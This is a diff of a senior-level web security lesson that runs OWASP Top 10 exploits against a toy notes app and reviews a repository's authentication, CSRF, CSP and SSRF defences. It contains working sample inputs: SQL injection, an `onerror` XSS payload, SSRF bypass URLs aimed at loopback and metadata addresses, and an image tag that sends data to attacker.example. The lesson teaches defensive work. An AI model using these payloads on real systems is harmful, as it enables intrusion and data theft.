@@ -8,34 +8,110 @@ tags: [security, owasp, authentication, sessions, csrf, xss, csp, secrets, senio
 ---
 Most breaches do not need a zero-day. They need one endpoint that returns another user's data when you change the ID in the URL. A login form that answers in 2 ms for unknown emails and 100 ms for real ones. A session table that stores tokens in plain text, so a leaked backup is a list of logged-in accounts. A rate limiter keyed on a header the attacker controls. Each is a small decision made by someone who was thinking about features.
 
-Security at the senior level is not a separate phase. It is a habit of asking, at every boundary, "who controls this input, and what happens if they lie?" This lesson walks through the controls you should expect in any web application, using the choices this repository makes (and a few it could make better) as the worked example.
+Security at the senior level is not a separate phase. It is a habit of asking, at every boundary, "who controls this input, and what happens if they lie?" This lesson runs each OWASP risk family as a concrete exploit against a small toy app, shows the fix, and then reads the controls this repository uses (and a few it could use better) as the worked example. The case study's [authentication and security lesson](/learn/case-study-ascend/the-system/authentication-and-security) follows the same code further.
 
-## A map, not a checklist
+## Ten risk families, each as an exploit and a fix
 
-The OWASP Top 10 (the 2021 edition is the one most teams cite; later editions reshuffle the list but keep the families) is best used as a map of where applications usually fail:
+The OWASP Top 10 (the 2021 edition is the one most teams cite; later editions reshuffle the list but keep the families) is best used as a map of where applications fail. The middle column is an attack on a toy notes app that stores each user's notes and offers search, comments and link previews; the payloads are minimal illustrations against that toy, not tools for anything real.
 
-| OWASP 2021 category | The question it asks | Where this app answers it |
-|---|---|---|
-| A01 Broken access control | Can a user act on data that is not theirs? | Ownership checks in core services |
-| A02 Cryptographic failures | Are secrets and credentials stored and sent safely? | Argon2id, hashed session tokens, HSTS |
-| A03 Injection | Can input become code (SQL, HTML, shell)? | Parameterised ORM queries, escaped rendering, CSP |
-| A04 Insecure design | Is the abuse case designed for? | Rate limits and per-user AI budgets |
-| A05 Security misconfiguration | Are the defaults safe? | Config validated at boot, strict headers |
-| A06 Vulnerable components | Do you know what you depend on? | Lockfiles; needs automated auditing in CI |
-| A07 Identification and authentication failures | Can identity be guessed, replayed or enumerated? | Timing-uniform login, opaque revocable sessions |
-| A08 Software and data integrity failures | Can the build or its inputs be tampered with? | Frozen lockfiles in the image build |
-| A09 Security logging and monitoring failures | Would you notice an attack? | Structured logs with request IDs |
-| A10 Server-side request forgery | Can input make the server call arbitrary URLs? | Outbound URLs come from config, never from users |
+| OWASP 2021 | Exploit against the toy notes app | Fix | In Ascend |
+|---|---|---|---|
+| A01 Broken access control | Logged in as Ada, `GET /notes/11` returns Bob's note, because the handler looks the note up by ID alone (run below) | Make the owner part of the query; answer 404 for "not yours" | `InterviewService::get` returns `NotFound` for another user's interview; `CommentService::delete` allows the author or an admin |
+| A02 Cryptographic failures | A leaked backup holds unsalted SHA-256 password hashes, and one GPU tests billions of guesses a second | A slow, salted, memory-hard hash; TLS everywhere; hashed session tokens | Argon2id; sessions stored as SHA-256 of the token; HSTS |
+| A03 Injection | The search term `%' OR 1=1 --` rewrites the `WHERE` clause (run below); a comment `<img src=x onerror=alert(1)>` concatenated into HTML runs script | Parameterised queries; escaping by the renderer; a CSP | SeaORM's builder or SQL with bound `$1` values; React escapes text; no inline-script CSP |
+| A04 Insecure design | A free AI endpoint called in a loop costs real money, and nothing in the design bounds it | Abuse cases designed in: quotas, budgets, cost ceilings | Per-session AI rate limit and per-user daily budgets in the database |
+| A05 Security misconfiguration | The API reflects any `Origin` into `Access-Control-Allow-Origin` with credentials allowed, so any site can read a signed-in user's data | Deny by default; validate configuration at boot | No CORS layer at all, so cross-origin reads stay blocked; production refuses to boot without `Secure` cookies |
+| A06 Vulnerable components | A transitive dependency with a published advisory ships for months unnoticed | Lockfiles, advisory scanning in CI, scheduled upgrades | Lockfiles and pnpm's supply-chain check on install; no `cargo audit` or advisory step in CI, a gap |
+| A07 Identification and authentication | Credential stuffing replays leaked email and password pairs from thousands of addresses; timing reveals which emails exist | Per-account limits, uniform timing and messages, MFA | 10 password attempts per minute per account; a dummy hash for unknown emails; one error message |
+| A08 Software and data integrity | CI runs a third-party action by a mutable tag, and the tag is repointed at code that prints the job's secrets | Pin actions and base images by digest; frozen lockfiles | Frozen lockfiles; actions and base images referenced by tag, a gap |
+| A09 Logging and monitoring | An attacker tries 50,000 passwords over a week and nobody notices | Structured security events with alerts on them | JSON logs with request IDs; no alert on authentication failures is defined in the repository |
+| A10 Server-side request forgery | A "preview this link" feature fetches `http://2130706433/`, which is 127.0.0.1 written as one number (run below) | Resolve the name, check every address, fetch from an isolated worker | The server never fetches a user-supplied URL; the AI provider's URL comes from configuration |
 
-The rest of the lesson takes the rows that most often decide a security review.
+The A08 row describes a real 2025 incident, in which a popular GitHub Action's version tags were moved to a commit that dumped CI secrets into build logs. Ascend's `.github/workflows/ci.yml` references every action by tag (`actions/checkout@v4`, `Swatinem/rust-cache@v2`), so the same move would reach it. The fix is to pin each third-party action to a full commit SHA and let a dependency bot propose updates.
 
-## Passwords: slow on purpose
+## Three exploits, run against the toy
 
-A stolen password table is attacked offline, at the attacker's pace. With a fast hash such as SHA-256, a single GPU tries billions of guesses per second, so every common password falls in minutes. The defence is a hash that is **deliberately expensive in both time and memory**, so each guess costs the attacker what it costs you.
+A01 and A03, in 25 lines of Python against an in-memory SQLite database. The comments show what each line prints.
 
-`crates/core/src/auth/password.rs` uses **Argon2id** with the crate's defaults: 19,456 KiB of memory, 2 passes, 1 lane, and a random 16-byte salt per password. Those numbers match the minimum configuration OWASP's password storage guidance recommends. The memory requirement is the point: GPUs have thousands of cores but not thousands of 19 MiB scratch spaces, so memory-hardness caps their parallelism. The salt makes every hash unique, so identical passwords do not share a hash and precomputed tables are useless.
+```python
+import sqlite3
 
-That cost lands on your server too, and the code handles it:
+db = sqlite3.connect(":memory:")
+db.executescript("""
+CREATE TABLE notes (id INTEGER PRIMARY KEY, owner_id INTEGER NOT NULL, body TEXT NOT NULL);
+INSERT INTO notes VALUES (10, 1, 'ada: shopping list'), (11, 2, 'bob: recovery codes 4417 9902');
+""")
+
+def search_vulnerable(user_id, term):               # A03: input becomes SQL text
+    sql = f"SELECT id, body FROM notes WHERE owner_id = {user_id} AND body LIKE '%{term}%'"
+    return db.execute(sql).fetchall()
+
+def search(user_id, term):                          # fix: the driver sends term as data
+    return db.execute("SELECT id, body FROM notes WHERE owner_id = ? AND body LIKE ?",
+                      (user_id, f"%{term}%")).fetchall()
+
+def get_note_vulnerable(user_id, note_id):          # A01: authenticated, never authorised
+    return db.execute("SELECT body FROM notes WHERE id = ?", (note_id,)).fetchone()
+
+def get_note(user_id, note_id):                     # fix: the owner is part of the key
+    return db.execute("SELECT body FROM notes WHERE id = ? AND owner_id = ?",
+                      (note_id, user_id)).fetchone()
+
+print(search_vulnerable(1, "shop"))                 # [(10, 'ada: shopping list')]
+print(search_vulnerable(1, "%' OR 1=1 --"))         # both rows: the WHERE clause was rewritten
+print(search(1, "%' OR 1=1 --"))                    # []: the quote is only a character
+print(get_note_vulnerable(1, 11))                   # Ada reads Bob's note by changing the id
+print(get_note(1, 11))                              # None, which the API turns into a 404
+```
+
+Trace the injection. The f-string produces `... WHERE owner_id = 1 AND body LIKE '%%' OR 1=1 --%'`. `AND` binds tighter than `OR`, so the condition becomes `(owner_id = 1 AND …) OR 1=1`, true for every row, and `--` comments out the stray quote. With a placeholder the driver sends the statement and the value separately, so the database never parses the value as SQL. Ascend's request paths build queries with SeaORM or write SQL with bound values (`$1` to `$5` in the AI budget's atomic upsert in `crates/core/src/ai/budget.rs`); the one `format!` in that statement splices a compile-time constant, not input.
+
+A10, against a preview feature that blocks internal hosts by string:
+
+```python
+import ipaddress, socket
+from urllib.parse import urlsplit
+
+def naive_allowed(url):                             # a string blocklist
+    host = urlsplit(url).hostname or ""
+    return host not in ("localhost", "127.0.0.1", "169.254.169.254") and not host.startswith(("10.", "192.168."))
+
+def allowed(url):                                   # resolve first, then check every address
+    host = urlsplit(url).hostname
+    if not host:
+        return False
+    for *_, sockaddr in socket.getaddrinfo(host, None):
+        ip = ipaddress.ip_address(sockaddr[0])
+        if ip.version == 6 and ip.ipv4_mapped:      # ::ffff:a.b.c.d is an IPv4 address in disguise
+            ip = ip.ipv4_mapped
+        if not ip.is_global:                        # loopback, private, link-local, reserved
+            return False
+    return True
+
+for url in ["http://2130706433/", "http://0x7f.1/", "http://[::ffff:169.254.169.254]/", "http://93.184.215.14/"]:
+    print(url, naive_allowed(url), allowed(url))
+# http://2130706433/ True False
+# http://0x7f.1/ True False
+# http://[::ffff:169.254.169.254]/ True False
+# http://93.184.215.14/ True True
+```
+
+The resolver accepts the old numeric forms (a single 32-bit number, hex, shortened dotted quads), so a string check never sees `127.0.0.1`. Checking the resolved addresses closes that door, and two remain: DNS rebinding (the name resolves to a public address at check time and a private one at connect time, so connect to the address you checked) and redirects (check again at every hop). The durable fix is structural: fetch from a worker with no route to internal networks, behind an egress proxy, as [security in design](/learn/system-design/building-blocks/security-in-design) draws it.
+
+## Under the hood: what a password hash costs
+
+A stolen password table is attacked offline, at the attacker's pace, so the hash must be expensive for each guess. Measured on one core of this lesson's machine (Python 3.14's `hashlib`, and Node 24.21's OpenSSL 3.5 for Argon2id):
+
+| Function | Parameters | Time per hash | Memory per hash | What it means for an attacker |
+|---|---|---|---|---|
+| SHA-256 | one pass | 0.17 µs | none | A GPU tries on the order of ten billion guesses a second |
+| PBKDF2-HMAC-SHA256 | 600,000 iterations | 49 ms | none | 600,000 times fewer guesses, but GPUs parallelise it freely |
+| scrypt | $N = 2^{17}$, $r = 8$, $p = 1$ | 197 ms | 128 MiB | Memory caps how many guesses run at once |
+| Argon2id | 19,456 KiB, 2 passes, 1 lane (Ascend's) | 11.9 ms | 19 MiB | A GPU with 24 GiB holds about 1,290 instances at a time |
+
+`crates/core/src/auth/password.rs` uses Argon2id with the `argon2` crate's defaults (those parameters, which match OWASP's minimum recommendation) and a random 16-byte salt per password, so identical passwords get different hashes and precomputed tables are useless. The pure-Rust crate is usually slower than OpenSSL's implementation, and the module's own comment estimates about 100 ms; budget tens of milliseconds and 19 MiB per call.
+
+That cost lands on the server too:
 
 ```rust
 static HASH_PERMITS: LazyLock<tokio::sync::Semaphore> = LazyLock::new(|| {
@@ -51,13 +127,13 @@ pub async fn hash(password: String) -> AppResult<String> {
 }
 ```
 
-A hash takes tens of milliseconds of CPU and 19 MiB of memory. Run on Tokio's async worker threads, it would stall every other request scheduled on that thread for the duration, so `spawn_blocking` moves it to the blocking pool. The first version stopped there, and a review found the gap: Tokio's blocking pool grows to 512 threads by default and queues work beyond that, so a burst of logins could put hundreds of Argon2 computations in flight at once, each holding its 19 MiB, and memory would run out long before CPU did (512 × 19 MiB is about 9.5 GiB). The semaphore now lets at most one hash per CPU (minimum two) run at a time; the rest wait for a permit, and the authentication rate limiter bounds how many can wait. `verify` takes the same permit. The rule generalises to any CPU-heavy call in an event loop: move it off the async workers, *and* bound how much of it can be in flight. See [async and event loops](/learn/systems/concurrency/async-and-event-loops).
+On Tokio's async workers a hash would stall every request scheduled on that thread, so `spawn_blocking` moves it to the blocking pool. The first version stopped there, and a review found the gap: the blocking pool grows to 512 threads by default, so a burst of logins could run hundreds of Argon2 computations at once, and 512 × 19 MiB is about 9.5 GiB, far past the container's memory. The semaphore now admits one hash per CPU (minimum two), `verify` takes the same permit, and the authentication rate limiter bounds how many wait. The rule generalises to any CPU-heavy call in an event loop: move it off the async workers *and* bound how much runs at once ([async and event loops](/learn/systems/concurrency/async-and-event-loops)).
 
-Password policy lives in `RegisterInput`: at least 10 characters, at most 200. Length beats composition rules ("one symbol, one digit"), which push users toward predictable patterns; current NIST guidance favours length plus screening against known-breached passwords. The upper bound caps the work a single request can force.
+`RegisterInput` requires 10 to 200 characters. Length beats composition rules, which push users toward predictable patterns, and current NIST guidance favours length plus screening against breached passwords; the upper bound caps the work one request can force.
 
 ## Login without leaking who has an account
 
-Here is the login path from `crates/core/src/auth/service.rs`:
+From `crates/core/src/auth/service.rs`:
 
 ```rust
 let user = Users::find().filter(users::Column::Email.eq(&email)).one(&self.db).await?;
@@ -68,60 +144,49 @@ let Some(user) = user.filter(|_| ok) else {
 };
 ```
 
-When the email is unknown, `password::verify` checks the password against a precomputed `DUMMY_HASH` and returns `ok && exists`, which is always false. Both branches pay one Argon2id verification, so response time does not reveal whether an account exists. Without this, an attacker with a stopwatch could enumerate registered emails: unknown addresses would return in a millisecond and real ones in a hundred. The error message is identical in both cases for the same reason. "Precomputed" took a fix to become true: `DUMMY_HASH` is a lazily initialised static, and it used to be computed by the first unknown-email login after each boot, outside the hashing semaphore, which made that one response about twice as slow as every other. `main` now calls `password::warm_up()` before it starts serving, so the hash exists before the first request. A timing defence has to cover the first call too.
+For an unknown email, `password::verify` checks against a precomputed `DUMMY_HASH` and returns `ok && exists`, always false, so both branches pay one Argon2id verification and the message is identical. Without it, a stopwatch enumerates accounts: unknown addresses return in a millisecond, real ones after a full hash. "Precomputed" took a fix: `DUMMY_HASH` is lazily initialised, and the first unknown-email login after each boot used to compute it, making that one response about twice as slow. `main` now calls `password::warm_up()` before serving. A timing defence has to cover the first call too.
 
-A senior reviewer would also check the *other* doors. `register` returns `Conflict("an account with that email already exists")`, so registration is an enumeration oracle even though login is not. It used to leak twice: the first version looked the email up *before* hashing, so "already registered" came back roughly 100 ms faster than a successful sign-up, and two simultaneous sign-ups for one address could both pass the check, with the loser hitting the unique index as a `500`. It now hashes first, inserts, and lets the unique index decide, mapping the violation to `409`; the integration test `concurrent_registrations_for_one_email_yield_one_account_and_conflicts` fires four sign-ups at once and expects one `200` and three `409`s. The message itself is a common, conscious trade-off: the full fix is an email-verification flow ("if this address can register, we have sent it a link"), which costs email infrastructure and friction. Here the mitigation is the per-IP authentication rate limit described below. Knowing that the trade exists, and saying so, is the senior part.
+Registration is the other door. It used to look the email up before hashing, so "already registered" came back about 100 ms faster than a successful sign-up, and two simultaneous sign-ups could both pass the check, the loser hitting the unique index as a `500`. It now hashes first, inserts, and lets the unique index decide, mapping the violation to `409`; `concurrent_registrations_for_one_email_yield_one_account_and_conflicts` in `crates/api/tests/api.rs` fires four sign-ups at once and expects one `200` and three `409`s. The message itself still reveals a registered email, a conscious trade: the full fix is an email-verification flow ("if this address can register, we have sent it a link"), which costs email infrastructure and friction, and the mitigation here is the per-IP authentication limit.
 
 ## Sessions: opaque tokens, stored hashed
 
-After login the server needs to recognise the browser on later requests. The two families:
+After login the server must recognise the browser. `crates/core/src/auth/token.rs` generates 32 random bytes (256 bits) as 43 URL-safe base64 characters, and the `sessions` table, created in `migration/src/m0001_identity.rs`, stores only their SHA-256 as its primary key, so an attacker holding the table holds hashes that cannot be turned back into cookies. The integration suite registers a user, takes the raw token from the cookie, and asserts that no row in `sessions` contains it.
 
-| | Server-side session (opaque token) | Self-contained token (JWT) |
+Why SHA-256 here when passwords need Argon2id? Entropy. A password is a few dozen bits of human-chosen text, so each guess must be slow. A 256-bit random token cannot be found at any guess rate: at $10^{12}$ guesses a second, searching half of $2^{256}$ takes about $10^{57}$ years. Slow hashing is for low-entropy secrets only.
+
+| | Opaque session (Ascend) | Self-contained JWT |
 |---|---|---|
-| What the client holds | A random ID with no meaning | Signed claims (user, roles, expiry) |
-| Server lookup per request | Yes (indexed primary key) | No, just verify the signature |
-| Revocation | Delete the row; effective immediately | Hard: wait for expiry, or keep a denylist (which is a session table again) |
-| Size | ~43 characters | Hundreds of bytes to kilobytes, on every request |
-| Key management | None | Signing keys to protect and rotate |
-| Best fit | First-party web apps | Service-to-service calls, federated identity, short-lived access tokens |
+| Per-request check | Indexed primary-key lookup | Signature verification, no I/O |
+| Revocation | Delete the row, effective at once | Wait for expiry, or keep a denylist (a session table again) |
+| Size | A 58-byte cookie | Hundreds of bytes to kilobytes |
+| Keys to manage | None | Signing keys to protect and rotate |
 
-`migration/src/m0001_identity.rs` records the decision in its doc comment: sessions can be revoked instantly (logout-everywhere, a compromised device), and the cookie only ever carries an opaque random token. `crates/core/src/auth/token.rs` generates 32 random bytes (256 bits), encoded as 43 URL-safe base64 characters, and the database stores only its **SHA-256**. The session table's primary key *is* that hash.
-
-The property is tested, not just intended: an integration test in `crates/api/tests/api.rs` registers a user, takes the raw token from the cookie, and asserts that no row in `sessions` contains it. The decision itself is recorded in `docs/adr/0002-server-side-sessions.md`, including the alternatives it rejected.
-
-Why SHA-256 here when passwords needed Argon2id? Because the input's entropy is different. A password is a few dozen bits of human-chosen guessable text, so the hash must be slow. A 256-bit random token cannot be guessed at any speed, so a fast hash is enough to make a leaked table useless: an attacker who steals `sessions` holds hashes that cannot be reversed into cookies. Slow hashing is for low-entropy secrets only.
-
-The surrounding details matter as much as the tokens:
-
-- `token::looks_valid` rejects anything that is not exactly 43 URL-safe characters before touching the database, so garbage cookies cost nothing.
-- `authenticate` deletes expired sessions it encounters, and a background task in `crates/api/src/main.rs` sweeps expired rows hourly.
-- `last_seen_at` is written at most once per hour, so an authenticated request does not become a database write.
-- `logout_everywhere` deletes every session for the user, which is the control you need after a password change or a lost laptop.
-- Deleting the account (`DELETE /api/auth/me`) requires the password as well as the session, so a stolen cookie alone cannot erase an account. Each attempt is charged to the same per-account password budget as login (below), so a stolen session cannot become a password-guessing oracle either. A wrong password is a `422`, not a `401`: the session is valid, and a 401 would make the SPA treat the learner as signed out.
-
-The cookie itself, set in `crates/api/src/routes/auth.rs`, is `HttpOnly` (page scripts cannot read it, so an XSS bug cannot exfiltrate it, though it can still act as the user while the page is open), `Secure` when configured, `SameSite=Lax`, and scoped to `/`. `crates/core/src/config.rs` refuses to boot in production unless `COOKIE_SECURE` is true, so a misconfigured deploy fails loudly instead of sending session cookies over plain HTTP.
+[Authentication and authorization](/learn/senior-craft/software-craft/authentication-and-authorization) measures those costs and builds the hybrid that JWTs need. The details around Ascend's tokens matter as much: `token::looks_valid` rejects anything that is not 43 URL-safe characters before touching the database; `authenticate` deletes expired sessions it meets and an hourly task sweeps the rest; `last_seen_at` is written at most hourly; `logout_everywhere` deletes every session for the user; and deleting the account requires the password as well as the session, charged to the same per-account attempt budget as login, answering a wrong password with `422` rather than a `401` that would make the SPA treat the learner as signed out. The cookie is `HttpOnly`, `SameSite=Lax`, scoped to `/`, and `Secure` when configured, and `crates/core/src/config.rs` refuses to boot in production unless it is.
 
 ## Authorisation: every query has an owner
 
-Broken access control tops the OWASP list because it is easy to forget and invisible in happy-path tests. The pattern that leaks is "fetch by ID, return it". The fix is that every read and write of user-owned data is scoped to the caller.
+The toy's `get_note_vulnerable` is broken access control in its purest form, and it passes every happy-path test. In Ascend, `InterviewService::get` in `crates/core/src/services/interviews.rs` returns `NotFound` when the interview's `user_id` is not the caller's, so another user's interview looks exactly like a missing one, and `CommentService::delete` allows the author or an admin and returns `Forbidden` otherwise. Both checks live in the core services, not in route handlers, so a future CLI or worker inherits them.
 
-`InterviewService::get` in `crates/core/src/services/interviews.rs` loads the interview and returns `NotFound` if `user_id` does not match, so another user's interview is indistinguishable from a missing one. `CommentService::delete` allows the author or an admin and returns `Forbidden` otherwise. Both checks live in the **core services**, not in route handlers, so any future entry point (a CLI, a worker) inherits them.
-
-Two review notes. First, the comment route used to compute `user.role == "admin"` itself and pass a boolean to the service, while `users::Model::is_admin()` already existed in core: the meaning of "admin" lived in the transport layer as well as the domain, and the next role would have been added to only one of them. The route now calls `user.is_admin()`, a method on core's `CurrentUser`, so the rule is defined in core. The fix is partial, and it is worth seeing why: the service still receives a bare boolean, and core now has two `is_admin` methods (on `users::Model` and on `CurrentUser`) with the same body. Passing the principal and letting the service decide would leave one definition and one caller. Second, "fetch then compare" works but depends on every author remembering the comparison. Filtering in the query (`WHERE id = $1 AND user_id = $2`) makes the safe path the only path.
+Two review notes. The comment route used to compute `user.role == "admin"` itself; it now calls `CurrentUser::is_admin`, so the meaning of "admin" is defined in core, though the service still receives a bare boolean and core has two `is_admin` methods with the same body; passing the principal would leave one definition. And "fetch, then compare" depends on every author remembering the comparison; filtering in the query (`WHERE id = $1 AND user_id = $2`), as the toy's fix does, makes the safe path the only path.
 
 ## CSRF: the problem with ambient credentials
 
-Browsers attach cookies to requests automatically, including requests triggered by *other* sites. If `evil.example` serves a page with an auto-submitting form that POSTs to your API, the victim's browser sends it with their session cookie. The server sees a valid session and a plausible request. That is cross-site request forgery, and any cookie-authenticated API must defend against it.
+Browsers attach cookies to requests triggered by *other* sites. If `evil.example` serves an auto-submitting form that POSTs to your API, the victim's browser sends their session cookie with it, and the server sees a valid session and a plausible request. `crates/api/src/middleware/csrf.rs` layers three independent defences:
 
-`crates/api/src/middleware/csrf.rs` uses independent layers, so no single browser quirk defeats it:
+1. **`SameSite=Lax` cookies.** Browsers withhold the cookie from cross-site POST, PUT and DELETE sub-requests. Lax still sends it on top-level GET navigations, which is why GET handlers must never change state.
+2. **Origin check.** On every mutating method, `Origin` (or, if absent, the origin part of `Referer`) must equal the configured `PUBLIC_ORIGIN` exactly: scheme, host and port. Requests with neither header come from non-browser clients, which carry no ambient cookies.
+3. **A required custom header.** Every POST, PUT, PATCH and DELETE must carry `X-Requested-With`. A cross-origin page cannot set a custom header without a CORS preflight, which this server never grants; `web/src/lib/api.ts` adds it to every request.
 
-1. **`SameSite=Lax` cookies.** Browsers do not send the cookie on cross-site POST, PUT or DELETE sub-requests. Lax still sends it on top-level GET navigations, which is why GET handlers must never change state.
-2. **Origin check.** For every mutating method, the `Origin` header (or, if absent, the origin part of the `Referer`) must equal the configured `PUBLIC_ORIGIN` exactly: same scheme, host and port. Requests with neither header come from non-browser clients, which carry no ambient cookies.
-3. **A required custom header.** Every POST, PUT, PATCH or DELETE must carry `X-Requested-With`. A cross-origin page cannot set a custom header without a CORS preflight, and this server never grants one. `web/src/lib/api.ts` adds the header to every request.
+Four forged requests traced through the layers, with `PUBLIC_ORIGIN` set to `https://ascend.example`:
 
-Why three? `SameSite` is a browser policy with a history of partial support, and "same-site" is not "same-origin": a compromised sibling subdomain counts as the same site. The custom-header rule depends on the server never enabling permissive CORS. Stacking them means each covers the others' gaps.
+| Forged request | Cookie attached? | Origin check | Custom header | Outcome |
+|---|---|---|---|---|
+| Auto-submitting `<form method="post">` on `evil.example` | No: a cross-site POST under Lax | `https://evil.example` is not the origin: reject | Absent, since forms cannot set headers: reject | `403 csrf`, three times over |
+| `fetch` with `method: "DELETE"`, `credentials: "include"` and an `X-Requested-With` header, from `evil.example` | Would be withheld | Not reached | The custom header forces a CORS preflight, which is never granted | The browser never sends the DELETE |
+| A form on a compromised `blog.ascend.example` | Yes: same site | `https://blog.ascend.example` is not the origin: reject | Absent: reject | `403 csrf`, with `SameSite` already beaten |
+| `curl` with a stolen cookie and the header | Yes, set by the attacker | Neither header present: allowed | Present | Allowed: this is session theft, which no CSRF defence addresses |
 
-There is also a lesson in how the Referer fallback used to work. The first version compared by string prefix (`referer.starts_with(expected)`), and a Referer of `https://ascend.example.evil.net/page` starts with `https://ascend.example`. The local-development allowance had the same shape: `origin.starts_with("http://localhost")` also matches `http://localhost.evil.net`. The custom-header layer still blocked forged requests, which is exactly why defence in depth exists, but in isolation a prefix comparison of origins is a classic bug. The middleware now delegates to a plain function, `allowed(headers, public_origin)`, which reduces a Referer to its origin (everything before the first `/`, `?` or `#` after the scheme), compares origins for equality, parses the host out of a local-development origin before comparing it with `localhost` or `127.0.0.1`, and is covered by unit tests that include each look-alike. Two habits generalise: compare security identifiers by parsing and equality, never by prefix, and pull the decision out of the framework so every tricky input can be tested in microseconds. The exercise asks you to implement an equivalent rule.
+`SameSite` is a browser policy with a history of partial support, and "same-site" is not "same-origin": a compromised sibling subdomain is the same site. The custom-header rule depends on the server never enabling permissive CORS. Stacked, each covers the others' gaps, and that paid off once. The first Referer check compared by prefix (`referer.starts_with(expected)`), which a Referer of `https://ascend.example.evil.net/page` satisfies, and the local-development allowance matched `http://localhost.evil.net` the same way. The custom header still blocked forged requests. The middleware now delegates to `allowed(headers, public_origin)`, which reduces a Referer to its origin, compares origins for equality, parses the host of a local-development origin before comparing it, and has unit tests for each look-alike. Compare security identifiers by parsing and equality, never by prefix, and pull the decision out of the framework so every tricky input is testable in microseconds.
 
 ```exercise
 id: csrf-gate
@@ -183,9 +248,9 @@ hints:
 
 ## XSS and the Content Security Policy
 
-Cross-site scripting is injection into HTML: attacker-controlled text rendered as markup, running script with the victim's session. The first defence is rendering, and React escapes text by default. The dangerous API is literally named `dangerouslySetInnerHTML`. Ascend used it once, for exercise prompts: `web/src/components/Exercise.tsx` escaped `&`, `<` and `>` *first* and then applied three whitelisted transformations (inline code, bold, line breaks). That was safe, but it was a second, hand-rolled Markdown renderer that every reviewer had to re-verify. Prompts now go through the same `Markdown` component as lessons (`react-markdown` with remark and rehype plugins and no raw-HTML plugin), and the codebase has no `dangerouslySetInnerHTML` at all. The one remaining direct HTML write is in `web/src/components/Mermaid.tsx`, which sets `innerHTML` to the SVG that Mermaid renders from a diagram block. That component also renders diagrams inside coach replies, which are model output, so it initialises Mermaid with `securityLevel: "strict"` (HTML in labels is encoded and click handlers are disabled). Fewer sinks is the goal; each one that remains should have a named reason and a hardening setting.
+Cross-site scripting is injection into HTML: the toy's comment `<img src=x onerror=alert(1)>`, concatenated into a page, runs script with the victim's session. The first defence is the renderer: React escapes text, and its one raw-HTML API is named `dangerouslySetInnerHTML`. Ascend used it once, for exercise prompts, behind a hand-rolled escaper that every reviewer had to re-verify; prompts now go through the same `react-markdown` component as lessons, with no raw-HTML plugin, and the codebase has no `dangerouslySetInnerHTML` at all. The one direct HTML write left is in `web/src/components/Mermaid.tsx`, which sets `innerHTML` to the SVG Mermaid renders; because it also renders diagrams in coach replies, which are model output, it initialises Mermaid with `securityLevel: "strict"`.
 
-The second defence is the **Content Security Policy**, which tells the browser what the page may load and execute even if an injection slips through. `crates/api/src/middleware/security_headers.rs` sets, among others:
+The second defence tells the browser what the page may load and run even if an injection slips through. `crates/api/src/middleware/security_headers.rs` sets, among others:
 
 ```text
 default-src 'self';
@@ -195,17 +260,13 @@ connect-src 'self' https://cdn.jsdelivr.net https://pypi.org https://files.pytho
 frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'
 ```
 
-There is no `'unsafe-inline'` for scripts, which is what blocks the classic injected `<script>` and `onerror=` payloads. There *is* `'unsafe-eval'`, and the file's comment explains why: the in-browser code runners (Pyodide and the JavaScript sandbox) need `new Function` and WebAssembly. That is a documented, deliberate weakening, compensated elsewhere: learner code runs in Web Workers with no DOM, `web/src/runner/js.worker.ts` removes `fetch`, `XMLHttpRequest`, `WebSocket`, `importScripts`, `indexedDB` and `caches` from the worker's global scope, and `web/src/runner/index.ts` terminates any worker that exceeds its time limit, "the only reliable way to stop a runaway loop in JS or Python". A senior security review accepts a weakened control when the compensating controls are named and tested.
+No `'unsafe-inline'` for scripts is what blocks injected `<script>` tags and `onerror=` handlers. `'unsafe-eval'` is a documented weakening: the in-browser runners (Pyodide and the JavaScript sandbox) need `new Function` and WebAssembly. It is compensated elsewhere: learner code runs in Web Workers with no DOM, `web/src/runner/js.worker.ts` removes `fetch`, `XMLHttpRequest`, `WebSocket`, `importScripts`, `indexedDB` and `caches` from the worker's scope, and `web/src/runner/index.ts` terminates any worker past its time limit. A review also tightened `img-src`, which used to allow any HTTPS host: an injected `<img src="https://attacker.example/?d=...">` carries data off a page with no script at all. Every source in a CSP should be there because a feature needs it.
 
-A review of the same policy tightened `img-src`. The first version allowed `'self' data: blob: https:`, which is any image on any HTTPS host. That looks harmless, since images do not execute, but an injected `<img src="https://attacker.example/?d=...">` is a classic way to carry data off a page with no script at all, and the attacker's server also learns who viewed the page and when. No page needed remote images, so the policy now allows only `'self' data: blob:`. Every source in a CSP should be there because a feature needs it, not because nothing obviously breaks.
-
-The same design shows a trust boundary drawn on purpose. Because learner code runs in the browser, test results arrive at the API as claims, not facts. `docs/adr/0003-client-side-code-execution.md` states the consequence plainly: submissions are self-reported, which is acceptable for practice ("a learner who fakes a result only cheats themselves"), and leaderboards or competitive features would need server-side verification. Threat modelling is mostly this: naming what an attacker gains by lying, and deciding whether it matters.
-
-The remaining headers each close one door: `frame-ancestors 'none'` and `X-Frame-Options: DENY` stop clickjacking, `X-Content-Type-Options: nosniff` stops the browser from executing a file served as another type, and `Strict-Transport-Security` with a one-year `max-age` tells browsers to refuse plain HTTP for this host.
+The same design draws a trust boundary on purpose. Learner code runs in the browser, so test results arrive as claims; `docs/adr/0003-client-side-code-execution.md` accepts that for practice ("a learner who fakes a result only cheats themselves") and says competitive features would need server-side verification. The remaining headers close one door each: `frame-ancestors 'none'` and `X-Frame-Options: DENY` stop clickjacking, `nosniff` stops content-type confusion, and `Strict-Transport-Security` with a one-year `max-age` makes browsers refuse plain HTTP.
 
 ## Transport: TLS everywhere
 
-HSTS only helps if TLS is right. In production the platform terminates TLS at its edge, and the app enforces the consequences: `COOKIE_SECURE` defaults to true whenever `PUBLIC_ORIGIN` starts with `https://`, and production refuses to boot without it. The handshake below is what protects the session cookie in transit; [TLS and PKI](/learn/networking/fundamentals/tls-and-pki) covers certificates and chains.
+The platform terminates TLS at its edge, and the app enforces the consequences: `COOKIE_SECURE` defaults to true whenever `PUBLIC_ORIGIN` starts with `https://`, and production refuses to boot without it. [TLS and PKI](/learn/networking/fundamentals/tls-and-pki) covers certificates and chains.
 
 ```viz
 {"type": "network", "scenario": "https-tls-handshake", "title": "TLS 1.3 protects the cookie in transit", "caption": "One round trip establishes keys; everything after, including the Cookie header, is encrypted. HSTS ensures the browser never tries plain HTTP first."}
@@ -213,47 +274,75 @@ HSTS only helps if TLS is right. In production the platform terminates TLS at it
 
 ## Rate limits and the client IP you can trust
 
-Rate limits are how you design for the abuse case. `crates/api/src/middleware/rate_limit.rs` keeps four keyed limiters (the `governor` crate implements GCRA, a token-bucket-equivalent algorithm), and the interesting decision in each is the key:
